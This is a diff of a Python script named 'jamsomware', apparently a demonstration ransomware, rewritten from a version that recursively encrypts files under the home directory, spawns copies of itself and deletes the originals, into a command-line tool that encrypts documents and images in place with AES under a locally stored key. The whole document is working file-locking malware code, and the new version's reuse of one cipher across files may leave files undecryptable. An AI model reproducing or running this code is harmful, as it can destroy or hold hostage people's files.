@@ -1,144 +1,195 @@
 #!/usr/bin/python
-# coding: ascii
+# coding: UTF-8
 
-import os
 import argparse
+import json
+import os
 import sys
-import subprocess
-import time
-from Cryptodome.Cipher import AES
+from base64 import b64decode, b64encode
+
+import logzero
 from Cryptodome import Random
-from Cryptodome.Random.random import *
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+from logzero import logger
 
-
-
-
-class Log:
-	def write(self, msg):
-		print(msg)
+EXTENSIONS = (
+    ".jpg",
+    ".JPG",
+    ".png",
+    ".PNG",
+    ".txt",
+    ".pdf",
+    ".doc",
+    ".docx",
+    ".xls",
+    ".xlsx",
+    ".ppt",
+    ".pptx",
+    ".odt",
+    ".ods",
+    ".odp",
+)
 
 
 class JamCrypt:
-	KEY_SIZE = 32
-	BLOCK_SIZE = 16
-	KEYFILE =  os.path.join(os.path.expanduser("~"), "jam.key")
-	key = None
+    block_size = 16
+    keyfile = None
+    key = None
+    src = None
+    cipher = None
+    count = 0
 
-	def __init__(self, key):
-		self.rndfile = Random.new()
-		if key == None:
-			log.write("Initalizing key")
-			self.key = self.rndfile.read(self.KEY_SIZE)
-			keyfile = open(self.KEYFILE, 'wb');
-			keyfile.write(self.key)
-		else:
-			self.key = key
-		self.IV = b"jamsomwareiscool"
+    def __init__(self, src, keyfile):
 
-	def encrypt(self, src):
-		infile = open(src, 'rb')
-		outfile = open(src+".enc", 'wb')
-		cipher = AES.new(self.key, AES.MODE_CBC, self.IV)
+        self.keyfile = keyfile
+        self.src = src
 
-		while True:
-			block = infile.read(self.BLOCK_SIZE)
-			if len(block) == 0:
-				break
-			elif len(block) % 16 != 0:
-				block += b' '  * (16-len(block)%16)
+        logger.debug(os.path.isfile(self.keyfile))
+        if os.path.isfile(self.keyfile):
+            self._load_keyfile()
+        else:
+            self._init_keyfile()
 
-			outfile.write(cipher.encrypt(block))
+    def _init_keyfile(self, keyfile=None):
+        """Initializes the keyfile"""
+        logger.info("Initalizing key file at %s", self.keyfile)
+        self.key = Random.get_random_bytes(32)
 
-	def decrypt(self, src):
-		infile = open(src, 'rb')
-		outfile = open(src+".dec", 'wb')
-		cipher = AES.new(self.key, AES.MODE_CBC, self.IV)
+        self._init_cipher()
 
-		while True:
-			block = infile.read(self.BLOCK_SIZE)
-			if len(block) == 0:
-				break
-			elif len(block) % 16 != 0:
-				block += ' '  * (16-len(block)%16)
+        with open(self.keyfile, "w", encoding="utf-8") as keyfile:
+            keyfile.write(
+                json.dumps(
+                    {
+                        "iv": b64encode(self.cipher.iv).decode("utf-8"),
+                        "key": b64encode(self.key).decode("utf-8"),
+                    }
+                )
+            )
 
-			outfile.write(cipher.decrypt(block))
+    def _init_cipher(self):
+        """Initializes the cipher"""
+        self.cipher = AES.new(self.key, AES.MODE_CBC)
 
+    def _load_keyfile(self):
+        """Loads the keyfile"""
+        logger.debug("Loading key file at %s", self.keyfile)
+        with open(self.keyfile, "r", encoding="utf-8") as keyfile:
+            try:
+                keyfile_data = json.loads(keyfile.read())
+            except json.JSONDecodeError:
+                logger.error("%s is not a valid key file", self.keyfile)
+                sys.exit(1)
+        self.key = b64decode(keyfile_data["key"])
+        self.cipher = AES.new(self.key, AES.MODE_CBC, b64decode(keyfile_data["iv"]))
+
+    def encrypt(self, src):
+        """Encrypts a file or directory"""
+        logger.info("Encrypting %s", src)
+        if os.path.isfile(src):
+            self._encrypt_file(src)
+        elif os.path.isdir(src):
+            self._encrypt_dir(src)
+        else:
+            logger.error("%s is not a file or directory", src)
+
+    def _encrypt_dir(self, src):
+        """Encrypts a directory"""
+        logger.debug("Encrypting directory %s", src)
+        for file in os.listdir(src):
+            logger.debug("Path found: %s", src + "/" + file)
+            if file.endswith(EXTENSIONS):
+                self._encrypt_file(src + "/" + file)
+            elif os.path.isdir(src + "/" + file):
+                self._encrypt_dir(src + "/" + file)
+
+    def _encrypt_file(self, src):
+        """Encrypts a file"""
+        logger.debug("Encrypting file %s", src)
+        with open(src, "rb") as infile:
+            plaintext = infile.read()
+
+        with open(src, "wb") as outfile:
+            outfile.write(self.cipher.encrypt(pad(plaintext, AES.block_size)))
+
+        self.count += 1
+
+    def decrypt(self, src):
+        """Decrypts a file or directory"""
+        logger.info("Decrypting %s", src)
+        if os.path.isfile(src):
+            self._decrypt_file(src)
+        elif os.path.isdir(src):
+            self._decrypt_dir(src)
+        else:
+            logger.error("%s is not a file or directory", src)
+
+    def _decrypt_dir(self, src):
+        """Decrypts a directory"""
+        logger.debug("Decrypting directory %s", src)
+        for file in os.listdir(src):
+            logger.debug("Path found: %s", src + "/" + file)
+            if file.endswith(EXTENSIONS):
+                self._decrypt_file(src + "/" + file)
+            elif os.path.isdir(src + "/" + file):
+                self._decrypt_dir(src + "/" + file)
+
+    def _decrypt_file(self, src):
+        """Decrypts a file"""
+        logger.debug("Decrypting file %s", src)
+        with open(src, "rb") as infile:
+            plaintext = infile.read()
+
+        with open(src, "wb") as outfile:
+            try:
+                outfile.write(unpad(self.cipher.decrypt(plaintext), AES.block_size))
+            except ValueError:
+                logger.error("%s is not a valid encrypted file", src)
+                return
+
+        self.count += 1
 
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--decrypt", action="store_true", default=False)
+    parser.add_argument("-e", "--encrypt", action="store_true", default=False)
+    parser.add_argument(
+        "-k", "--key", default=os.path.join(os.path.expanduser("~"), "jam.key")
+    )
+    parser.add_argument("path", help="Directory/file to encrypt/decrypt")
+    parser.add_argument("--verbose", "-v", action="store_true", default=False)
+    args = parser.parse_args()
 
+    if not args.verbose:
+        logzero.loglevel(logzero.INFO)
 
-	parser = argparse.ArgumentParser()
-	parser.add_argument('-d', '--decrypt', nargs=1)
-	parser.add_argument('-e', '--encrypt', nargs=1)
-	parser.add_argument('-k', '--key', nargs=1)
-	parser.add_argument('--clean', action="store_true", default=False)
-	parser.add_argument('--dir',nargs=1)
-	args = parser.parse_args()
+    # if args.key:
+    #     keyfilehandle = open(args.key, "rb")
+    #     key = keyfilehandle.read(JamCrypt.key_size)
 
-	key = None
-	keyfile = None
-	dir = None
-	log = Log();
-	extensions = [".jpg", ".JPG", ".png", ".PNG", ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp"]
+    if args.encrypt and args.decrypt:
+        logger.error("Cannot encrypt and decrypt at the same time")
+        sys.exit(1)
 
+    logger.info("Starting jamsomware")
+    logger.info("==================================================")
+    jamcrypt = JamCrypt(args.path, args.key)
 
-	if args.key:
-		keyfilehandle = open(args.key[0], 'rb')
-		key = keyfilehandle.read(JamCrypt.KEY_SIZE)
-		
-	if not args.key and args.decrypt:
-		log.write("For decrypting you need to specify a key")
-		sys.exit(1)
+    if args.decrypt:
+        logger.debug("Decrypt %s", args.decrypt)
+        jamcrypt.decrypt(args.path)
+    elif args.encrypt:
+        logger.debug("Encrypt %s", args.encrypt)
+        jamcrypt.encrypt(args.path)
+    else:
+        logger.error("No action specified")
 
-	if args.dir:
-		dir = args.dir[0]
-	else:
-		dir = os.path.expanduser("~")
-
-
-	if args.clean:
-		for root,dirs,files in os.walk(dir):
-			for file in files:
-				if file.endswith(".enc") or file.endswith(".dec"):
-					log.write("Removing " + os.path.join(root,file))
-					os.remove(os.path.join(root,file))
-		sys.exit(0)
-
-	crypt = JamCrypt(key)
-
-	if args.decrypt:
-		log.write("Decrypt " + args.decrypt[0])
-		crypt.decrypt(args.decrypt[0]) 
-		sys.exit(0)
-	if args.encrypt:
-		log.write("Encrypt " + args.encrypt[0])
-		crypt.encrypt(args.encrypt[0])
-		os.remove(args.encrypt[0])
-		sys.exit(0)
-
-	if keyfile == None:
-		keyfile = crypt.KEYFILE
-
-
-
-	for file in os.listdir(dir):
-		sleep =  2*random()
-		time.sleep(sleep)
-		pathfile = os.path.join(dir, file)
-
-		if os.path.isdir(pathfile):
-			if sys.argv[0].endswith(".py"):
-				subprocess.Popen(["python", sys.argv[0], "-k", keyfile, "--dir", pathfile])
-			else:
-				subprocess.Popen([sys.argv[0], "-k", keyfile, "--dir", pathfile])
-			log.write(sys.argv[0])
-		elif file.endswith(tuple(extensions)):
-			crypt.encrypt(pathfile)
-			os.remove(pathfile)
-		else:
-			pass
-	
-
-
-
+    logger.info("==================================================")
+    logger.info(
+        "Finished %s %s files",
+        jamcrypt.count,
+        "encrypted" if args.encrypt else "decrypted",
+    )
+    logger.info("==================================================")
